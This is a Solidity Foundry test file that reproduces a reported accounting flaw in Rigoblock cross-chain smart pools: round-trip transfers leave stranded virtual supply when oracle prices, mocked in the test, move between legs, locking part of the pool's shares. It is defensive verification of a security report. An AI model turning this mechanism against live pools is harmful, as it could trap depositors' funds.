// SPDX-License-Identifier: Apache-2.0-or-later
pragma solidity 0.8.37;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {Constants} from "../../contracts/test/Constants.sol";
import {RealDeploymentFixture} from "../fixtures/RealDeploymentFixture.sol";

import {ISmartPool} from "../../contracts/protocol/ISmartPool.sol";
import {IRigoblockPoolProxyFactory} from "../../contracts/protocol/interfaces/IRigoblockPoolProxyFactory.sol";
import {ISmartPoolActions} from "../../contracts/protocol/interfaces/v4/pool/ISmartPoolActions.sol";
import {ISmartPoolOwnerActions} from "../../contracts/protocol/interfaces/v4/pool/ISmartPoolOwnerActions.sol";
import {ISmartPoolState} from "../../contracts/protocol/interfaces/v4/pool/ISmartPoolState.sol";
import {IERC20} from "../../contracts/protocol/interfaces/IERC20.sol";
import {IAIntents} from "../../contracts/protocol/extensions/adapters/interfaces/IAIntents.sol";
import {IECrosschain} from "../../contracts/protocol/extensions/adapters/interfaces/IECrosschain.sol";
import {IEOracle} from "../../contracts/protocol/extensions/adapters/interfaces/IEOracle.sol";
import {IOracle} from "../../contracts/protocol/interfaces/IOracle.sol";
import {OpType, DestinationMessageParams, SourceMessageParams, Call, Instructions} from "../../contracts/protocol/types/Crosschain.sol";
import {VirtualStorageLib} from "../../contracts/protocol/libraries/VirtualStorageLib.sol";
import {NavImpactLib} from "../../contracts/protocol/libraries/NavImpactLib.sol";

import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";

/// @notice Interface for the real Across MulticallHandler contract
interface IMulticallHandler {
    function handleV3AcrossMessage(address token, uint256, address, bytes memory message) external;
    function drainLeftoverTokens(address token, address payable destination) external;
}

/// @title PoCVsRoundTrip - Reproduction of the virtual-supply round-trip residual ("pismol" report)
/// @notice A Transfer out (chain A) writes -VS at the initiation-time unitaryValue; the matching
///         Transfer back (chain A inbound) writes +VS at the arrival-time unitaryValue. If the pool's
///         NAV per share on chain A moves between those two snapshots, the two legs do not cancel and
///         a residual VS is stranded. This test reproduces the effect on mainnet+Base forks with real
///         Across depositV3 calls and real MulticallHandler fills, moving the BackGeoOracle TWAP via
///         vm.mockCall on oracle.observe() (the same technique the researcher used; repo precedent in
///         DonateOracleManipulationFork.t.sol). No protocol code is modified.
/// @dev The price move is applied BETWEEN the outbound and the return legs ("market moves between
///      the legs"), i.e. mocks are installed on the relevant fork after the first arrival and remain
///      active through the return leg.
contract PoCVsRoundTripTest is Test, RealDeploymentFixture {
    uint256 constant TOLERANCE_BPS = 800; // 8%
    int24 constant TICKS_10PCT = 953; // log_1.0001(1.1)  ~= 953 ticks (+10%)
    int24 constant TICKS_25PCT = 2231; // log_1.0001(1.25) ~= 2231 ticks (+25%)
    int24 constant TICKS_50PCT = 4055; // log_1.0001(1.5)  ~= 4055 ticks (+50%)

    bytes32 constant VS_SLOT = VirtualStorageLib.VIRTUAL_SUPPLY_SLOT;

    // Base pool composition targets
    uint256 constant BASE_EXTRA_MINT = 900_000e6; // extra user mint on top of fixture's 100k
    uint256 constant BASE_WETH_TARGET_USDC = 500_000e6; // Sync-donated WETH worth (6-dec USDC)

    // Test 12 (user scenario): originator book = 750k USDC + 750k-worth WETH, NAV ~1.5M at par
    uint256 constant WETH_LOSS_EXTRA_MINT = 1_400_000e6; // extra user mint so Base reaches ~1.5M USDC
    uint256 constant WETH_BOOK_TARGET = 750_000e6; // WETH worth target AND the matching sync-out
    uint256 constant DUST_WETH = 0.001e18; // WETH activation donate (~$3, sub-ulp NAV impact)

    // Measured per-scenario state
    struct Scenario {
        uint256 transferAmount; // T (6-dec USDC)
        int256 vsBase;
        int256 vsEth;
        uint256 uBase;
        uint256 uEth;
        uint256 navBase;
        uint256 navEth;
        uint256 tsBase;
        uint256 tsEth;
        uint256 burnt1; // -VS written by outbound source leg (Base)
        uint256 minted1; // +VS written by first arrival (Eth)
        uint256 burnt2; // -VS written by return source leg (Eth)
        uint256 minted2; // +VS written by return arrival (Base)
    }

    function setUp() public {}

    /*//////////////////////////////////////////////////////////////////////////
                                    HELPERS
    //////////////////////////////////////////////////////////////////////////*/

    function _readVS(address pool) internal view returns (int256) {
        return int256(uint256(vm.load(pool, VS_SLOT)));
    }

    function _poolTokens(address pool) internal returns (ISmartPoolState.PoolTokens memory) {
        ISmartPoolActions(pool).updateUnitaryValue();
        return ISmartPoolState(pool).getPoolTokens();
    }

    /// @notice Mirrors EOracle._getSecondsAgos so the mockCall calldata matches exactly
    function _getSecondsAgos(uint16 cardinality) internal view returns (uint32[] memory secondsAgos) {
        uint16 blockTime = block.chainid == 1 ? 8 : 1;
        uint32 maxSecondsAgos = cardinality > 1 ? uint32(uint16(cardinality - 1) * blockTime) : 1;
        secondsAgos = new uint32[](2);
        secondsAgos[0] = maxSecondsAgos > 300 ? 300 : maxSecondsAgos;
        secondsAgos[1] = 0;
    }

    /// @notice Shift the ETH/USDC BackGeoOracle TWAP observed by EOracle by `tickChange` ticks by
    ///         mocking oracle.observe() (repo pattern from DonateOracleManipulationFork.t.sol).
    ///         Positive tickChange = the USDC-per-ETH feed ticks up = ETH/WETH appreciates vs USDC.
    /// @dev Must be called while the fork where `oracle` lives is selected.
    function _installUsdcFeedMock(address oracle, address usdc, int24 tickChange) internal {
        PoolKey memory poolKey = PoolKey({
            currency0: Currency.wrap(address(0)),
            currency1: Currency.wrap(usdc),
            fee: 0,
            tickSpacing: TickMath.MAX_TICK_SPACING,
            hooks: IHooks(oracle)
        });

        IOracle.ObservationState memory state = IOracle(oracle).getState(poolKey);
        require(state.cardinality > 1, "oracle pool not initialized");

        uint32[] memory secondsAgos = _getSecondsAgos(state.cardinality);

        (int48[] memory origTicks, uint144[] memory liquidity) = IOracle(oracle).observe(poolKey, secondsAgos);

        int56 origDelta = int56(origTicks[1]) - int56(origTicks[0]);
        int56 window = int56(uint56(secondsAgos[0]));
        int24 newTwap = int24(origDelta / window) + tickChange;

        int48[] memory mockedTicks = new int48[](2);
        mockedTicks[0] = int48(int56(origTicks[1]) - int56(newTwap) * window);
        mockedTicks[1] = origTicks[1];

        vm.mockCall(
            oracle,
            abi.encodeWithSelector(IOracle.observe.selector, poolKey, secondsAgos),
            abi.encode(mockedTicks, liquidity)
        );
    }

    /// @notice Sync-mode donation: adds tokens to the pool with no VS impact (NAV-impacting)
    function _syncDonate(address pool, address token, uint256 amount) internal {
        deal(token, address(this), amount);
        DestinationMessageParams memory params = DestinationMessageParams({
            opType: OpType.Sync,
            shouldUnwrapNative: false
        });
        IECrosschain(pool).donate(token, 1, params);
        IERC20(token).transfer(pool, amount);
        IECrosschain(pool).donate(token, amount, params);
    }

    /// @notice Build the destination instruction stream exactly as AIntents._buildMulticallInstructions does
    function _buildDestInstructions(
        address token,
        address pool,
        uint256 amount,
        address handler,
        OpType opType
    ) internal pure returns (Instructions memory) {
        Call[] memory calls = new Call[](4);
        DestinationMessageParams memory destParams = DestinationMessageParams({
            opType: opType,
            shouldUnwrapNative: false
        });
        calls[0] = Call({
            target: pool,
            callData: abi.encodeCall(IECrosschain.donate, (token, 1, destParams)),
            value: 0
        });
        calls[1] = Call({target: token, callData: abi.encodeCall(IERC20.transfer, (pool, amount)), value: 0});
        calls[2] = Call({
            target: handler,
            callData: abi.encodeCall(IMulticallHandler.drainLeftoverTokens, (token, payable(pool))),
            value: 0
        });
        calls[3] = Call({
            target: pool,
            callData: abi.encodeCall(IECrosschain.donate, (token, amount, destParams)),
            value: 0
        });
        return Instructions({calls: calls, fallbackRecipient: address(0)});
    }

    /// @notice Execute a real depositV3 on the source chain (1:1 amounts, Transfer mode).
    /// @dev Must be called while the source chain's fork is selected.
    function _depositV3(
        address pool,
        address inputToken,
        address outputToken,
        uint256 amount,
        uint256 destChainId
    ) internal {
        _depositV3(pool, inputToken, outputToken, amount, destChainId, OpType.Transfer);
    }

    /// @notice Execute a real depositV3 on the source chain with an explicit OpType.
    /// @dev Sync mode removes the assets with NO virtual supply write on either chain.
    function _depositV3(
        address pool,
        address inputToken,
        address outputToken,
        uint256 amount,
        uint256 destChainId,
        OpType opType
    ) internal {
        deal(inputToken, poolOwner, amount);
        vm.prank(poolOwner);
        IERC20(inputToken).approve(pool, amount);
        vm.prank(poolOwner);
        IAIntents(pool).depositV3(
            IAIntents.AcrossParams({
                depositor: poolOwner,
                recipient: poolOwner,
                inputToken: inputToken,
                outputToken: outputToken,
                inputAmount: amount,
                outputAmount: amount,
                destinationChainId: destChainId,
                exclusiveRelayer: address(0),
                quoteTimestamp: uint32(block.timestamp),
                fillDeadline: uint32(block.timestamp + 1 hours),
                exclusivityDeadline: 0,
                message: abi.encode(
                    SourceMessageParams({
                        opType: opType,
                        navTolerance: TOLERANCE_BPS,
                        shouldUnwrapOnDestination: false,
                        sourceNativeAmount: 0
                    })
                )
            })
        );
    }

    /// @notice Simulate the Across fill on the destination chain via the real MulticallHandler.
    /// @dev Must be called while the destination chain's fork is selected.
    function _simulateFill(address pool, address handler, address token, uint256 amount) internal {
        _simulateFill(pool, handler, token, amount, OpType.Transfer);
    }

    /// @notice Simulate the Across fill with an explicit destination OpType.
    function _simulateFill(address pool, address handler, address token, uint256 amount, OpType opType) internal {
        deal(token, handler, amount);
        vm.prank(user);
        IMulticallHandler(handler).handleV3AcrossMessage(
            token,
            amount,
            user,
            abi.encode(_buildDestInstructions(token, pool, amount, handler, opType))
        );
    }

    /*//////////////////////////////////////////////////////////////////////////
        SINGLE-SUPPLY GEOMETRY: external try/catch wrappers
    //////////////////////////////////////////////////////////////////////////*/

    /// @notice Initiate the full-WETH return leg from Eth (external so try/catch can catch it)
    function trySingleReturnLeg(uint256 wethAmount) external {
        _depositV3(ethereum.pool, Constants.ETH_WETH, Constants.BASE_WETH, wethAmount, Constants.BASE_CHAIN_ID);
    }

    /// @notice Initiate a USDC Transfer from the Eth pool (external so try/catch can catch it)
    function trySingleUsdcTransfer(uint256 amount) external {
        _depositV3(ethereum.pool, Constants.ETH_USDC, Constants.BASE_USDC, amount, Constants.BASE_CHAIN_ID);
    }

    /// @notice Initiate a PARTIAL WETH return leg from the Eth pool (external so try/catch can catch it)
    function tryPartialReturnLeg(uint256 wethAmount) external {
        _depositV3(ethereum.pool, Constants.ETH_WETH, Constants.BASE_WETH, wethAmount, Constants.BASE_CHAIN_ID);
    }

    /// @notice Sync-out attempt for the Eth-side WETH dust (external so try/catch can catch it)
    function trySingleSyncOut(uint256 wethAmount) external {
        _depositV3(
            ethereum.pool,
            Constants.ETH_WETH,
            Constants.BASE_WETH,
            wethAmount,
            Constants.BASE_CHAIN_ID,
            OpType.Sync
        );
    }

    /// @notice Operator burns Eth shares paying the base token (try/catch wrapper)
    function tryOperatorBurnEth(uint256 amount) external {
        vm.prank(poolOwner);
        ISmartPoolActions(ethereum.pool).burn(amount, 0);
    }

    /// @notice Operator burns Eth shares valued `amount` (base units), paid in WETH (try/catch wrapper)
    function tryOperatorBurnForTokenEth(uint256 amount) external {
        vm.prank(poolOwner);
        ISmartPoolActions(ethereum.pool).burnForToken(amount, 0, Constants.ETH_WETH);
    }

    /// @notice Deploy the standard two-pool scenario:
    ///         - Base pool (USDC base): user mints 1M USDC total, pool Sync-holds ~$500k of WETH.
    ///           NAV ~$1.5M, TS = 1M shares -> the NAV-sensitive "destination" pool.
    ///         - Eth pool (USDC base): fixture's 100k USDC mint only, pure USDC -> u pinned at 1.0.
    function _deployUsdcScenario() internal {
        address[] memory baseTokens = new address[](2);
        baseTokens[0] = Constants.ETH_USDC;
        baseTokens[1] = Constants.BASE_USDC;
        deployFixture(baseTokens);

        vm.selectFork(baseForkId);
        uint256 wethAmount = _wethAmountFor(base.pool, Constants.BASE_WETH, Constants.BASE_USDC, BASE_WETH_TARGET_USDC);
        _syncDonate(base.pool, Constants.BASE_WETH, wethAmount);

        // grow Base supply to 1M shares so a 20%-of-NAV transfer is payable from the USDC wallet
        vm.startPrank(user);
        IERC20(Constants.BASE_USDC).approve(base.pool, type(uint256).max);
        ISmartPool(payable(base.pool)).mint(user, BASE_EXTRA_MINT, 0);
        vm.stopPrank();

        _warpPastLockup(base.pool);
        vm.selectFork(mainnetForkId);
        _warpPastLockup(ethereum.pool);
    }

    /// @notice Pure-stablecoin variant: BOTH pools hold ONLY their base USDC (the Base-side WETH
    ///         sync-donate of _deployUsdcScenario is deliberately omitted). Every unitaryValue is
    ///         pinned at par (1e6) and no oracle feed is consulted for NAV - the cleanest
    ///         substrate for isolating operator-action effects from market-price effects.
    /// @param extraMint Extra user mint on the Base pool on top of the fixture's 100k (6-dec).
    function _deployPureUsdcScenario(uint256 extraMint) internal {
        address[] memory baseTokens = new address[](2);
        baseTokens[0] = Constants.ETH_USDC;
        baseTokens[1] = Constants.BASE_USDC;
        deployFixture(baseTokens);

        vm.selectFork(baseForkId);
        deal(Constants.BASE_USDC, user, extraMint);
        vm.startPrank(user);
        IERC20(Constants.BASE_USDC).approve(base.pool, type(uint256).max);
        ISmartPool(payable(base.pool)).mint(user, extraMint, 0);
        vm.stopPrank();

        _warpPastLockup(base.pool);
        vm.selectFork(mainnetForkId);
        _warpPastLockup(ethereum.pool);

        assertEq(_u(ethereum.pool), 1e6, "Eth u pinned at par");
        vm.selectFork(baseForkId);
        assertEq(_u(base.pool), 1e6, "Base u pinned at par (pure USDC)");
    }

    /// @notice Warp the current fork past the pool's minimum holding period (default 30 days)
    function _warpPastLockup(address pool) internal {
        uint48 minPeriod = ISmartPoolState(pool).getPoolParams().minPeriod;
        vm.warp(block.timestamp + minPeriod + 1000);
    }

    function _wethAmountFor(
        address pool,
        address weth,
        address usdc,
        uint256 targetUsdcValue
    ) internal view returns (uint256) {
        uint256 usdcPer100Weth = uint256(IEOracle(pool).convertTokenAmount(weth, 100e18, usdc));
        require(usdcPer100Weth > 0, "no WETH price feed");
        return (100e18 * targetUsdcValue) / usdcPer100Weth;
    }

    /// @notice Run the full round trip: Base -(T)-> Eth -(T)-> Base, with `baseTicks`/`ethTicks`
    ///         applied to the respective USDC feeds BETWEEN the outbound and the return legs.
    /// @dev The Base-feed mock stays active on the Base fork after return (the "market" remains
    ///      moved); callers clear with vm.clearMockedCalls() if needed.
    function _runRoundTrip(int24 baseTicks, int24 ethTicks) internal returns (Scenario memory s) {
        // -- Base pool state before transfer --
        vm.selectFork(baseForkId);
        assertEq(_readVS(base.pool), 0, "precondition: Base VS starts at 0");
        uint256 navBaseBefore = ISmartPoolActions(base.pool).updateUnitaryValue().netTotalValue;
        s.transferAmount = (navBaseBefore * 20) / 100; // 20% of Base NAV, 6-dec USDC

        // -- Leg 1: Base -> Eth source leg (writes -VS on Base at initiation-time u) --
        _depositV3(base.pool, Constants.BASE_USDC, Constants.ETH_USDC, s.transferAmount, Constants.ETHEREUM_CHAIN_ID);
        s.vsBase = _readVS(base.pool);
        s.burnt1 = uint256(-s.vsBase);

        // -- Leg 2: arrival on Eth (writes +VS on Eth at arrival-time u) --
        vm.selectFork(mainnetForkId);
        _simulateFill(ethereum.pool, Constants.ETH_MULTICALL_HANDLER, Constants.ETH_USDC, s.transferAmount);
        s.vsEth = _readVS(ethereum.pool);
        s.minted1 = uint256(s.vsEth);

        // -- Market move between the legs --
        if (ethTicks != 0) _installUsdcFeedMock(Constants.ORACLE, Constants.ETH_USDC, ethTicks);

        // -- Leg 3: Eth -> Base return source leg (writes -VS on Eth) --
        _depositV3(ethereum.pool, Constants.ETH_USDC, Constants.BASE_USDC, s.transferAmount, Constants.BASE_CHAIN_ID);
        int256 vsEthAfter = _readVS(ethereum.pool);
        s.burnt2 = uint256(s.vsEth - vsEthAfter);
        s.vsEth = vsEthAfter;

        // -- Leg 4: arrival on Base (writes +VS on Base at arrival-time u) --
        vm.selectFork(baseForkId);
        if (baseTicks != 0) _installUsdcFeedMock(Constants.BASE_ORACLE, Constants.BASE_USDC, baseTicks);
        int256 vsBaseMid = _readVS(base.pool);
        _simulateFill(base.pool, Constants.BASE_MULTICALL_HANDLER, Constants.BASE_USDC, s.transferAmount);
        s.vsBase = _readVS(base.pool);
        s.minted2 = uint256(s.vsBase - vsBaseMid);

        // -- Measure --
        ISmartPoolState.PoolTokens memory baseTokensAfter = _poolTokens(base.pool);
        s.uBase = baseTokensAfter.unitaryValue;
        s.tsBase = baseTokensAfter.totalSupply;
        s.navBase = ISmartPoolActions(base.pool).updateUnitaryValue().netTotalValue;

        vm.selectFork(mainnetForkId);
        ISmartPoolState.PoolTokens memory ethTokensAfter = _poolTokens(ethereum.pool);
        s.uEth = ethTokensAfter.unitaryValue;
        s.tsEth = ethTokensAfter.totalSupply;
        s.navEth = ISmartPoolActions(ethereum.pool).updateUnitaryValue().netTotalValue;

        // invariant: residual on Base is exactly (-burnt1 + minted2)
        assertEq(s.vsBase, -int256(s.burnt1) + int256(s.minted2), "Base VS = -burnt1 + minted2");
        return s;
    }

    function _logScenario(string memory name, Scenario memory s) internal view {
        console2.log("==== ", name);
        console2.log("  transfer T (USDC 6-dec):", s.transferAmount);
        console2.log("  Base: VS (raw):", s.vsBase);
        console2.log("  Base: unitaryValue:", s.uBase);
        console2.log("  Base: totalSupply:", s.tsBase);
        console2.log("  Base: netTotalValue:", s.navBase);
        console2.log("  Eth : VS (raw):", s.vsEth);
        console2.log("  Eth : unitaryValue:", s.uEth);
        console2.log("  Eth : totalSupply:", s.tsEth);
        console2.log("  Eth : netTotalValue:", s.navEth);
        console2.log("  legs: burnt1:", s.burnt1);
        console2.log("  legs: minted1:", s.minted1);
        console2.log("  legs: burnt2:", s.burnt2);
        console2.log("  legs: minted2:", s.minted2);
        if (s.vsBase < 0) {
            uint256 vsAbs = uint256(-s.vsBase);
            uint256 pin = (vsAbs * 20 + 18) / 19; // ceil(20|VS|/19)
            console2.log("  Base: |VS| raw:", vsAbs);
            console2.log("  Base: phantom NAV (TS*u/1e6 - netTotalValue):", (s.tsBase * s.uBase) / 1e6 - s.navBase);
            console2.log("  Base: locked-tail shares (ceil(20|VS|/19)):", pin);
            console2.log("  Base: locked-tail bps of TS:", (pin * 10000) / s.tsBase);
        }
    }

    /// @notice Burn shares down to `targetTS`, paying in base token while liquidity allows and
    ///         switching to WETH redemption (burnForToken) when the base wallet runs dry. Chunks
    ///         are sized to the full wallet value: the burn fee is carved out of the claim (the
    ///         collector receives 0.1% of it), so a full-value chunk always pays out - wallets
    ///         drain to zero exactly and the tail is payable by the base-token dust.
    function _burnDownTo(address pool, address baseToken, address weth, uint256 targetTS) internal {
        uint256 guard;
        while (ISmartPoolState(pool).getPoolTokens().totalSupply > targetTS) {
            require(++guard < 100, "burn loop did not converge");
            uint256 ts = ISmartPoolState(pool).getPoolTokens().totalSupply;
            uint256 remaining = ts - targetTS;
            uint256 u = _poolTokens(pool).unitaryValue;
            uint256 usdcBal = IERC20(baseToken).balanceOf(pool);
            uint256 maxByLiquidity = (usdcBal * 1e6) / u;
            if (remaining <= maxByLiquidity) {
                vm.prank(user);
                ISmartPoolActions(pool).burn(remaining, 0);
                break;
            }
            if (maxByLiquidity > 0) {
                uint256 chunk = remaining < maxByLiquidity ? remaining : maxByLiquidity;
                vm.prank(user);
                ISmartPoolActions(pool).burn(chunk, 0);
                continue;
            }
            // base token wallet exhausted: redeem in WETH, chunked to the full WETH wallet value
            uint256 wethBal = IERC20(weth).balanceOf(pool);
            uint256 wethValue = uint256(IEOracle(pool).convertTokenAmount(weth, int256(wethBal), baseToken));
            uint256 wethChunk = remaining < wethValue ? remaining : wethValue;
            if (wethChunk == 0) {
                // safety net only: payouts never exceed claims, so this state is unreachable
                uint256 micro = remaining < usdcBal ? remaining : usdcBal;
                require(micro > 0, "no payable dust path to target");
                vm.prank(user);
                ISmartPoolActions(pool).burn(micro, 0);
                continue;
            }
            vm.prank(user);
            ISmartPoolActions(pool).burnForToken(wethChunk, 0, weth);
        }
        assertEq(ISmartPoolState(pool).getPoolTokens().totalSupply, targetTS, "burned down to target");
    }

    /*//////////////////////////////////////////////////////////////////////////
                        1. CONTROL: NO PRICE MOVE
    //////////////////////////////////////////////////////////////////////////*/

    /// @notice Control: round trip with no price move. VS must be exactly 0 on both chains and the
    ///         full supply must be burnable.
    function test_Control_NoPriceMove_ZeroResidual() public {
        _deployUsdcScenario();
        Scenario memory s = _runRoundTrip(0, 0);
        _logScenario("CONTROL (no move)", s);

        assertEq(s.vsBase, 0, "Base VS must be exactly 0");
        assertEq(s.vsEth, 0, "Eth VS must be exactly 0");

        vm.selectFork(baseForkId);
        _burnDownTo(base.pool, Constants.BASE_USDC, Constants.BASE_WETH, 0);
        assertEq(_readVS(base.pool), 0, "VS untouched by burns");
        console2.log("CONTROL: full Base supply burned, VS still 0 - OK");
    }

    /*//////////////////////////////////////////////////////////////////////////
            2. SYMMETRIC +10%: QUANTIFY + BURN PIN + STUCK-OR-NOT + REMEDY
    //////////////////////////////////////////////////////////////////////////*/

    /// @notice Round trip with a +10% ETH/USDC move applied symmetrically on both chains between
    ///         the legs. Base pool (holds WETH) strands NEGATIVE VS; Eth pool (pure USDC) stays 0.
    ///         Then: burn-to-pin boundary, mint/donate availability, remedy transfer.
    function test_Plus10_Symmetric_BaseNegativeResidual() public {
        _deployUsdcScenario();
        Scenario memory s = _runRoundTrip(TICKS_10PCT, TICKS_10PCT);
        _logScenario("SYMMETRIC +10% (Eth pool pure USDC)", s);

        // --- quantified claims ---
        assertLt(s.vsBase, 0, "Base must strand NEGATIVE VS");
        assertEq(s.vsEth, 0, "Eth pool (pure USDC, u pinned 1.0) must have zero VS");
        assertGt(s.minted2, 0, "return leg wrote +VS");
        assertGt(s.burnt1, s.minted2, "return leg minted FEWER shares than the outbound leg burnt");

        uint256 vsAbs = uint256(-s.vsBase);
        uint256 pin = (vsAbs * 20 + 18) / 19; // ceil(20|VS|/19): min surviving totalSupply
        assertGt(pin, 0, "pin exists");

        // phantom NAV: EVM claims (TS*u) exceed on-chain assets
        uint256 phantom = (s.tsBase * s.uBase) / 1e6 - s.navBase;
        assertGt(phantom, 0, "phantom NAV must be positive");

        vm.selectFork(baseForkId);

        // --- 3a/3b: mints and donations still succeed with negative VS in place ---
        uint256 tsBefore = ISmartPoolState(base.pool).getPoolTokens().totalSupply;
        deal(Constants.BASE_USDC, user, 100_000e6); // fixture deals overwrote the user balance
        vm.prank(user);
        uint256 minted = ISmartPool(payable(base.pool)).mint(user, 1000e6, 0);
        assertGt(minted, 0, "mint succeeded");
        assertEq(
            ISmartPoolState(base.pool).getPoolTokens().totalSupply,
            tsBefore + minted,
            "TS grew by the minted amount"
        );

        _syncDonate(base.pool, Constants.BASE_USDC, 1000e6); // Sync donation, no VS
        assertEq(_readVS(base.pool), s.vsBase, "donate does not change VS");

        // the test mint above re-locked the user for the holding period; warp past it
        _warpPastLockup(base.pool);

        // --- burns do NOT relieve the pin (VS is untouched by burns) ---
        vm.prank(user);
        ISmartPoolActions(base.pool).burn(1, 0);
        assertEq(_readVS(base.pool), s.vsBase, "burns never change VS");

        // --- 2: burn exactly (TS - pin) -> succeeds, TS lands exactly on the pin ---
        _burnDownTo(base.pool, Constants.BASE_USDC, Constants.BASE_WETH, pin);
        assertEq(ISmartPoolState(base.pool).getPoolTokens().totalSupply, pin, "TS == ceil(20|VS|/19)");
        assertTrue(19 * pin >= 20 * vsAbs, "pin satisfies validateSupply");
        assertTrue(19 * (pin - 1) < 20 * vsAbs, "one less share violates validateSupply");

        // --- one share beyond the pin reverts with EffectiveSupplyTooLow ---
        vm.prank(user);
        vm.expectRevert(NavImpactLib.EffectiveSupplyTooLow.selector);
        ISmartPoolActions(base.pool).burn(1, 0);
        console2.log("Pin boundary verified: burn of maxBurnable OK, +1 share reverts EffectiveSupplyTooLow");

        // --- 4: remedy: a NEW inbound Transfer (Eth -> Base) relieves the pin ---
        // A SMALL inbound transfer adds +VS (amountValue/u at arrival) that cancels part of the
        // negative VS. (A large one overshoots and flips VS positive - the +VS is denominated in
        // arrival-time u, so it cannot be tuned to zero by the operator.)
        int256 vsBeforeRemedy = _readVS(base.pool);
        vm.selectFork(mainnetForkId);
        _depositV3(ethereum.pool, Constants.ETH_USDC, Constants.BASE_USDC, 5000e6, Constants.BASE_CHAIN_ID);
        vm.selectFork(baseForkId);
        _simulateFill(base.pool, Constants.BASE_MULTICALL_HANDLER, Constants.BASE_USDC, 5000e6);
        int256 vsAfterRemedy = _readVS(base.pool);

        assertLt(vsAfterRemedy, 0, "still negative after a small remedy");
        assertGt(vsAfterRemedy, vsBeforeRemedy, "inbound transfer relieved the pin (|VS| shrank)");
        uint256 pinAfter = (uint256(-vsAfterRemedy) * 20 + 18) / 19;
        assertLt(pinAfter, pin, "pin shrank after remedy");
        console2.log("Remedy: inbound 5k USDC transfer - pin before:", pin);
        console2.log("Remedy: pin after:", pinAfter);
    }

    /*//////////////////////////////////////////////////////////////////////////
                3/4. CRUX: SYMMETRIC vs ASYMMETRIC PRICE MOVE
    //////////////////////////////////////////////////////////////////////////*/

    /// @notice Asymmetric variant: only the BASE oracle moves +10%. The Base residual is identical
    ///         in structure to the symmetric case; Eth (pure USDC) stays exactly 0. This shows the
    ///         Base residual depends ONLY on Base's own NAV moving between its two snapshots.
    function test_Plus10_Asymmetric_BaseOracleOnly() public {
        _deployUsdcScenario();
        Scenario memory s = _runRoundTrip(TICKS_10PCT, 0);
        _logScenario("ASYMMETRIC +10% (Base oracle only)", s);

        assertLt(s.vsBase, 0, "Base strands NEGATIVE VS when only its own oracle moved");
        assertEq(s.vsEth, 0, "Eth VS exactly 0 - no Eth move, no Eth residual");
        assertGt(s.burnt1, s.minted2, "return leg minted fewer shares than outbound burnt");
    }

    /// @notice Asymmetric variant: only the ETH oracle moves +10%. Base VS must be EXACTLY zero:
    ///         the transferred token is USDC (identity conversion on Base) and Base's own NAV never
    ///         moved, so the two Base legs cancel perfectly. Eth (pure USDC, u pinned) also stays 0.
    ///         => The residual is NOT caused by cross-chain oracle basis per se; it arises iff the
    ///         NAV/share of a chain moves between that chain's outbound and inbound snapshots.
    function test_Plus10_Asymmetric_EthOracleOnly() public {
        _deployUsdcScenario();
        Scenario memory s = _runRoundTrip(0, TICKS_10PCT);
        _logScenario("ASYMMETRIC +10% (Eth oracle only)", s);

        assertEq(s.vsBase, 0, "Base VS exactly 0 when Base NAV never moved");
        assertEq(s.vsEth, 0, "Eth VS exactly 0 (pure-USDC pool, u pinned, identity conversions)");
    }

    /// @notice Researcher-faithful variant: the SOURCE pool (Eth) has WETH as base token and holds
    ///         only WETH (unitaryValue pinned at 1.0 WETH), while the transferred token is USDC.
    ///         The +10% move (symmetric) repriced USDC between the arrival and the return, so the
    ///         Eth pool strands POSITIVE VS (fewer shares burnt on the way out than minted on the
    ///         way in, both computed at u ~= 1.0), while Base strands NEGATIVE VS.
    function test_Plus10_ResearcherVariant_WethBaseSource() public {
        address[] memory baseTokens = new address[](2);
        baseTokens[0] = Constants.ETH_WETH;
        baseTokens[1] = Constants.BASE_USDC;
        deployFixture(baseTokens);

        // Eth pool: base WETH, holds only WETH -> unitaryValue pinned at 1.0 WETH/share
        vm.selectFork(mainnetForkId);
        uint256 uEth0 = _poolTokens(ethereum.pool).unitaryValue;
        assertEq(uEth0, 1e18, "Eth pool u starts pinned at 1.0 (WETH base)");

        // Base pool: same NAV-sensitive composition as the main scenario
        vm.selectFork(baseForkId);
        uint256 wethAmount = _wethAmountFor(base.pool, Constants.BASE_WETH, Constants.BASE_USDC, BASE_WETH_TARGET_USDC);
        _syncDonate(base.pool, Constants.BASE_WETH, wethAmount);
        vm.startPrank(user);
        IERC20(Constants.BASE_USDC).approve(base.pool, type(uint256).max);
        ISmartPool(payable(base.pool)).mint(user, BASE_EXTRA_MINT, 0);
        vm.stopPrank();
        _warpPastLockup(base.pool);
        vm.selectFork(mainnetForkId);
        _warpPastLockup(ethereum.pool);

        Scenario memory s = _runRoundTrip(TICKS_10PCT, TICKS_10PCT);
        _logScenario("RESEARCHER VARIANT +10% (Eth base=WETH, u pinned 1.0)", s);

        assertLt(s.vsBase, 0, "Base strands NEGATIVE VS (its WETH holding repriced vs USDC base)");
        assertGt(s.vsEth, 0, "Eth strands POSITIVE VS (USDC repriced vs WETH base between legs)");
        assertGt(s.burnt2, 0, "return source leg burnt shares on Eth");
        assertGt(s.minted1, s.burnt2, "fewer shares burnt on return than minted on arrival");
        // unitaryValue on Eth barely moved from 1.0 (positive VS slightly deflates it)
        assertApproxEqAbs(s.uEth, 1e18, 1e16, "Eth unitaryValue remains ~pinned at 1.0");
    }

    /*//////////////////////////////////////////////////////////////////////////
                        5. LOCKED-TAIL % AT +25% AND +50%
    //////////////////////////////////////////////////////////////////////////*/

    function _quantifyLockedTail(int24 ticks, string memory name) internal {
        _deployUsdcScenario();
        Scenario memory s = _runRoundTrip(ticks, ticks);
        _logScenario(name, s);

        assertLt(s.vsBase, 0, "negative residual expected");
        uint256 pin = (uint256(-s.vsBase) * 20 + 18) / 19;
        console2.log("locked-tail bps of TS:", (pin * 10000) / s.tsBase);
    }

    function test_Plus25_Symmetric_Quantify() public {
        _quantifyLockedTail(TICKS_25PCT, "SYMMETRIC +25%");
    }

    function test_Plus50_Symmetric_Quantify() public {
        _quantifyLockedTail(TICKS_50PCT, "SYMMETRIC +50%");
    }

    /*//////////////////////////////////////////////////////////////////////////
        6. NAV PARITY: DOES CROSS-CHAIN NAV SYNC PREVENT/REMEDY THE RESIDUAL?
    //////////////////////////////////////////////////////////////////////////*/

    /// @notice Deploy MIRROR pools: both chains USDC base, both hold ~$500k WETH + $1M USDC,
    ///         both TS ~= 249.6k shares, so unitaryValues track each other across chains.
